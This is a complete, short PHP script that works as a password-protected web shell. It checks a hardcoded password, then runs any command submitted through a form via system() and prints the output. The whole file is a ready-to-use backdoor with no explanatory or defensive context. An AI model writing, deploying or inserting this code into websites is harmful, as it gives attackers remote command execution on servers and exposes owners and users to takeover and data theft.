<?php
session_start();
$password = "test123";

if(!isset($_SESSION['auth']) && (!isset($_POST['pass']) || $_POST['pass'] != $password)) {
 echo '<form method="POST">
 Password: <input type="password" name="pass">
 <input type="submit">
 </form>';
 exit;
}

$_SESSION['auth'] = true;

if(isset($_POST['cmd'])) {
 echo "<pre>";
 system($_POST['cmd']);
 echo "</pre>";
}

echo '<form method="POST">
 Command: <input type="text" name="cmd" size="50">
 <input type="submit" value="Execute">
 </form>';
?>
